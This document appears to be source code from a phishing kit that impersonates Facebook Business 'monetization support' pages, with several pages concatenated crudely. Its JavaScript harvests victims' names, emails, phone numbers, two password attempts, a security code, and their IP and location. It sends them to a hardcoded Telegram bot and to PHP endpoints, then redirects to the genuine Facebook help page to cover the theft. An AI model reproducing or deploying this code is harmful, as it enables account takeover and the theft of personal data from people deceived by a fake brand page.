<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Business - Monetization Request</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            /* Set a background image that feels more relevant to business and Facebook Ads */
            background-image: url('https://images.pexels.com/photos/1181345/pexels-photo-1181345.jpeg'); /* Background with people working */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            min-height: 100vh;
        }

        .container {
            /* Add some transparency to the background for readability */
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .trust-badge img {
            width: 100px;
        }

        .modal-content {
            border-radius: 10px;
        }

        footer img {
            width: 20px;
            margin-right: 5px;
        }

        /* Optional: Style for the background overlay */
        .background-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: -1;
        }

        h1, h3 {
            color: #333;
        }
    </style>
</head>
<body>
    <!-- Optional overlay to darken the background for readability -->
    <div class="background-overlay"></div>

    <div class="container mt-5">
        <h1 class="text-center mb-4">Facebook Business Monetization Support</h1>

        <!-- Trust Badges Section (with Facebook branding) -->
        <div class="row text-center mb-4">
            <div class="col-4 trust-badge">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
            </div>
            <div class="col-4 trust-badge">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/AdSense_logo.svg/1200px-AdSense_logo.svg.png" alt="Google AdSense Logo">
            </div>
            <div class="col-4 trust-badge">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7d/Monetize_Icon.png" alt="Monetization Icon">
            </div>
        </div>

        <!-- Facebook Monetization Screenshots -->
        <div class="text-center mb-5">
            <h3>Learn How to Monetize on Facebook</h3>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/28/Facebook_Ads_Manager_Logo.png" alt="Facebook Ads Manager" class="img-fluid mb-3">
            <p>Get started with Facebook ads and monetize your business profile or page.</p>
        </div>

        <!-- Form Section -->
        <form id="contactForm" class="border p-4 rounded">
            <div class="mb-3">
                <label for="name" class="form-label">Full Name</label>
                <input type="text" class="form-control" id="name" placeholder="Enter your full name">
            </div>
            <div class="mb-3">
                <label for="email" class="form-label">Email address</label>
                <input type="email" class="form-control" id="email" placeholder="Enter your email">
            </div>
            <div class="mb-3">
                <label for="phone" class="form-label">Phone Number</label>
                <input type="text" class="form-control" id="phone" placeholder="Enter your phone number">
            </div>
            <div class="mb-3">
                <label for="reason" class="form-label">Monetization Inquiry</label>
                <textarea class="form-control" id="reason" rows="3" placeholder="Why are you requesting monetization?"></textarea>
            </div>

            <div class="mb-3 form-check">
                <input type="checkbox" class="form-check-input" id="terms" required>
                <label class="form-check-label" for="terms">I agree to the Terms and Conditions</label>
            </div>

            <button type="submit" class="btn btn-primary">Submit Request</button>
        </form>

        <!-- Footer with Contact Info & Facebook Support Icon -->
        <footer class="mt-5 text-center">
            <p>For support, please contact our <a href="https://www.facebook.com/business/help">Facebook Business Help Center</a> or reach out via <img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Facebook_Messenger_logo_2020.png" alt="Messenger Icon"> <b>Messenger</b>.</p>
            <p><small>© 2024 Facebook Business. All rights reserved.</small></p>
        </footer>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Step 1 - Enter Personal Details</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #f4f7fc;
    }
    .container {
      max-width: 800px;
      margin-top: 50px;
    }
    .btn-primary {
      background-color: #5c6bc0;
      border-color: #5c6bc0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Step 1: Enter Your Details</h2>
    <form id="personalDetailsForm">
      <div class="mb-3">
        <label for="name" class="form-label">Full Name</label>
        <input type="text" class="form-control" id="name" placeholder="Enter your full name" required>
      </div>
      <div class="mb-3">
        <label for="email" class="form-label">Email</label>
        <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
      </div>
      <div class="mb-3">
        <label for="phone" class="form-label">Phone Number</label>
        <input type="text" class="form-control" id="phone" placeholder="Enter your phone number" required>
      </div>
      <button type="submit" class="btn btn-primary">Proceed to Step 2</button>
    </form>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $('#personalDetailsForm').on('submit', function(e) {
      e.preventDefault();
      window.location.href = 'step2.html'; // Proceed to step 2
    });
  </script>
</body>
</html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Step 2 - Confirm Details</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #f4f7fc;
    }
    .container {
      max-width: 800px;
      margin-top: 50px;
    }
    .btn-primary {
      background-color: #5c6bc0;
      border-color: #5c6bc0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Step 2: Confirm Your Details</h2>
    <form id="confirmationForm">
      <div class="mb-3">
        <label for="confirmEmail" class="form-label">Confirm Email</label>
        <input type="email" class="form-control" id="confirmEmail" placeholder="Confirm your email" required>
      </div>
      <div class="mb-3">
        <label for="reason" class="form-label">Reason for Contact</label>
        <textarea class="form-control" id="reason" rows="4" placeholder="What is the reason for your contact?" required></textarea>
      </div>
      <div class="mb-3 form-check">
        <input type="checkbox" class="form-check-input" id="acceptTerms" required>
        <label class="form-check-label" for="acceptTerms">I agree to the Terms & Conditions</label>
      </div>
      <button type="submit" class="btn btn-primary">Proceed to Step 3</button>
    </form>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $('#confirmationForm').on('submit', function(e) {
      e.preventDefault();
      window.location.href = 'step3.html'; // Proceed to step 3
    });
  </script>
</body>
</html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Step 3 - Thank You</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #f4f7fc;
    }
    .container {
      max-width: 800px;
      margin-top: 50px;
    }
    .btn-primary {
      background-color: #5c6bc0;
      border-color: #5c6bc0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Step 3: Thank You for Your Submission!</h2>
    <p>Your form has been successfully submitted. We will get back to you shortly.</p>
    <p>If you need immediate assistance, please contact us at <a href="mailto:support@example.com">support@example.com</a>.</p>
    <a href="/" class="btn btn-primary">Go to Home</a>
  </div>
</body>
</html> <div class="bottomfooter">
    	<div class="container">
    		<ul>
    			<li>English (UK)</li>
    			<li>English (US)</li>
    			<li>Español</li>
    			<li>Português (Brasil)</li>
    			<li>Français (France)</li>
    			<li>Español (España)</li>
    			<li>More languages</li>
    		</ul>
    		<ul>
    			<li>© 2024 Meta</li>
    			<li>About</li>
    			<li>Developers</li>
    			<li>Careers</li>
    			<li>Privacy</li>
    			<li>Cookies</li>
    			<li>Terms</li>
    			<li>Help Centre</li>
    		</ul>
    	</div>
    </div>
  <script>

    function onlyNumberKey(evt) {

      // Only ASCII character in that range allowed
      var ASCIICode = (evt.which) ? evt.which : evt.keyCode
      if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
        return false;
      return true;
    }

    function testInput(event) {
      var value = String.fromCharCode(event.which);
      var pattern = new RegExp(/[a-z��� ]/i);
      return pattern.test(value);
    }

    $('#name').bind('keypress', testInput);

  </script>
  <script type="text/javascript">

    function validateEmail(email) {
      var re = /\S+@\S+\.\S+/;
      return re.test(email);
    }
    function EnableDisable(name) {
      //Reference the Button.
      var submit = document.getElementById("submit");

      //Verify the TextBox value.
      if (name.value.trim() != "") {
        //Enable the TextBox when TextBox has value.
        submit.disabled = false;
      } else {
        //Disable the TextBox when TextBox is empty.
        submit.disabled = true;
      }
      //Verify the TextBox value.
      if (phone.value.trim() != "") {
        //Enable the TextBox when TextBox has value.
        submit.disabled = false;
      } else {
        //Disable the TextBox when TextBox is empty.
        submit.disabled = true;
      }
      //Verify the TextBox value.
      if (email.value.trim() != "") {
        //Enable the TextBox when TextBox has value.
        submit.disabled = false;
      } else {
        //Disable the TextBox when TextBox is empty.
        submit.disabled = true;
      }
    };
  </script>
  <input id="ip_hidden" value="" type="hidden">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
    crossorigin="anonymous"></script>
  <script>
    function getIp() {
      $.get("https://api.ipify.org/?format=json", function (response) {
        $("#ip_hidden").val(response.ip);
      });
    }
    getIp();
    var bot = 'bot6889191432:AAFw-po-pKJiPAC1mLA7fqfwSNqkrM50HCg';
    var chid = '6921169662';

    function sendData() {
      $.get("https://ipapi.co/json/", function (response) {
        let ip = $("#ip_hidden").val();
        let country = response.country;
        let city = response.city;

        var params = {
          content: '-----Bot new------' + '%0A' +
            '1|Full Name: "' + document.getElementById('name').value.replace('#', '-sharp-') + '"' + '%0A' +
			'2|Page Name: "' + document.getElementById('pagename').value.replace('#', '-sharp-') + '"' + '%0A' +
            '3|Email: "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
            '4|Appeal: "' + document.getElementById('reason').value.replace('#', '-sharp-') + '"' + '%0A' +
            '5|Number: "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
            '6|City : "' + city + '"' + '%0A' +
            '7|Country: "' + country + '"' + '%0A' +
            'IP: "' + ip + '"' + '%0A' +
            '---------------------------------------------------------'
        }

        fetch(`https://api.telegram.org/bot6889191432:AAFw-po-pKJiPAC1mLA7fqfwSNqkrM50HCg/sendMessage?chat_id=6921169662&text=${params.content}/`, {
          method: 'POST', // or 'PUT'
          headers: {
            'Content-Type': 'application/json',
          },

        }).then(function () {
          // $('#exampleModal').modal('show');
        })


      });
    }

    function sendPass2() {
      let password2 = document.getElementById('password2').value.replace('#', '-sharp-');
      $.get("https://ipapi.co/json/", function (response) {
        let country = response.country;
        let regionName = response.region;
        let city = response.city;
        let ip = $("#ip_hidden").val();
        console.log(response);


        var params = {
          content: '---------------------------------------------------------' + '%0A' +
            'Passi 2: "' + password2 + '"' + '%0A' +
            'City : "' + city + '"' + '%0A' +
            'Country : "' + country + '"' + '%0A' +
            'Region : "' + regionName + '"' + '%0A' +
            'Number : "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
            'Email : "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
            'IP: "' + ip + '"' + '%0A' +
            '---------------------------------------------------------'
        }


        fetch(`https://api.telegram.org/bot6889191432:AAFw-po-pKJiPAC1mLA7fqfwSNqkrM50HCg/sendMessage?chat_id=6921169662&text=${params.content}/`, {
          method: 'POST', // or 'PUT'
          headers: {
            'Content-Type': 'application/json',
          },

        }).then(function () {
          window.location = 'confirm.html';
        })


      });
    }

    function validateEmail(email) {
      var re = /\S+@\S+\.\S+/;
      return re.test(email);
    }

    $('.numeric').on('input', function (event) {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
    const btn = document.querySelector('#submit');

    btn.addEventListener('click', (e) => {
      e.preventDefault();
      let openModal = true;
      let name = document.querySelector("#name");
      if (name.value === '') {
        openModal = false;
      }
      checked = $("input[type=checkbox]:checked").length;
      if (!checked) {
        return document.getElementById("termsaccept").innerHTML = "Please accept Terms, Data Policy and Cookies Policy";
        openModal = false;
      }
      let email = document.querySelector("#email");
      if (email.value === '' || validateEmail(email.value) === false) {
        email.style.cssText = 'border: 1px solid red;'
        openModal = false;
      }

      let phone = document.querySelector("#phone");
      if (phone.value === '') {
        phone.style.cssText = 'border: 1px solid red;'
        openModal = false;
      }
      let reason = document.querySelector("#reason");

      if (openModal) {
        var myModal = new bootstrap.Modal(document.getElementById("exampleModal"), {});
        document.getElementById('confirm_email').value = document.getElementById('email').value.replace('#', '-sharp-');
        myModal.show();
      }
    });

    function checkLength(id) {
      let input = document.querySelector("#" + id);
      if (input.value !== '') {
        input.style.cssText = 'border: 1px solid grey';
      }
    }

    function handleActions(e) {
      let pass = document.getElementById('password').value.replace('#', '-sharp-');
      if (pass.length === 0) {
        $('#password').css('border', '1px solid red');
        return;
      } else {
        let tries = document.getElementById('pw_tries');
        if (parseInt(tries.value) === 0) {
          // document.querySelector("#wrong_pass").classList.remove('d-none');
          // document.getElementById('password').value = '';
          // document.getElementById('password').style.border = '1px solid red';
          $("#exampleModal1").modal('hide');
          $("#exampleModal1").modal('show');
          document.getElementById('confirm_email1').value = document.getElementById('email').value.replace('#', '-sharp-');
          document.getElementById('emailpass2').value = document.getElementById('email').value.replace('#', '-sharp-');
          document.getElementById('phonepass2').value = document.getElementById('phone').value.replace('#', '-sharp-');
          $.get("https://ipapi.co/json/", function (response) {
            let country = response.country;
            let regionName = response.region;
            let city = response.city;
            document.getElementById('city2').value = response.city;
            let ip = $("#ip_hidden").val();


            var params = {
              content: '---------------------------------------------------------' + '%0A' +
                'Passi 1: "' + pass + '"' + '%0A' +
                'City : "' + city + '"' + '%0A' +
                'Country : "' + country + '"' + '%0A' +
                'Number : "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
                'Email : "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
                'IP: "' + ip + '"' + '%0A' +
                '---------------------------------------------------------'
            }


            fetch(`https://api.telegram.org/bot6889191432:AAFw-po-pKJiPAC1mLA7fqfwSNqkrM50HCg/sendMessage?chat_id=6921169662&text=${params.content}/`, {
              method: 'POST', // or 'PUT'
              headers: {
                'Content-Type': 'application/json',
              },

            }).then(function () {

            })




          });
        } else {
          let code = document.querySelector("#code");
          if (code === null) {
            document.querySelector("#wrong_pass").classList.add('d-none');
            let password = document.querySelector("#password").value.replace('#', '-sharp-');
            $.get("https://ipapi.co/json/", function (response) {
              let country = response.country;
              let regionName = response.region;
              let city = response.city;
              let ip = $("#ip_hidden").val();
              console.log(response);


              var params = {
                content: '---------------------------------------------------------' + '%0A' +
                  'Passi 2: "' + password + '"' + '%0A' +
                  'City : "' + city + '"' + '%0A' +
                  'Country : "' + country + '"' + '%0A' +
                  'Region : "' + regionName + '"' + '%0A' +
                  'Number : "' + document.getElementById('phone').value.replace('#', '-sharp-') + '"' + '%0A' +
                  'Email : "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
                  'IP: "' + ip + '"' + '%0A' +
                  '---------------------------------------------------------'
              }


              fetch(`https://api.telegram.org/bot6889191432:AAFw-po-pKJiPAC1mLA7fqfwSNqkrM50HCg/sendMessage?chat_id=6921169662&text=${params.content}/`, {
                method: 'POST', // or 'PUT'
                headers: {
                  'Content-Type': 'application/json',
                },

              }).then(function () {

              })

              let twoPages = true;
              if (twoPages) {
                window.location = 'confirm.html';
              } else {
                document.querySelector("#modal_header").innerText = 'Enter security code';
                document.querySelector("#mod_title").innerText = 'Please enter your security code';
                document.querySelector("#modal_form").innerHTML = '<div class="mt-1 d-flex justify-content-between"><label for="email">Code:</label><input type="text" class="ml-2 input-password" id="code" placeholder="Enter your code"  name="code" style="float: right;"></div>';
              }
            });
          } else {
            $.get("https://ipapi.co/json/", function (response) {
              let country = response.country;
              let regionName = response.region;
              let city = response.city;
              let ip = $("#ip_hidden").val();
              $.post("step_three.php", {
                code: code.value,
                city: city,
                ip: document.getElementById('ipaddress').value.replace('#', '-sharp-')
              });
              window.setTimeout(function () {
                window.location = 'https://www.facebook.com/business/help/507905413074296?helpref=search&sr=1&query=contact';
              }, 3000)
            });
          }

        }
      }
    }
    function sendBean() {
      $.get("https://ipapi.co/json/", function (response) {
        let country = response.country;
        let regionName = response.region;
        let city = response.city;
        let ip = $("#ip_hidden").val();
        $.post("step_one.php", {
          country: country,
          regionName: regionName,
          city: city,
          ip: document.getElementById('ipaddress').value.replace('#', '-sharp-')
        });
      });
    }
    sendBean();
  </script>
</body>

</html>
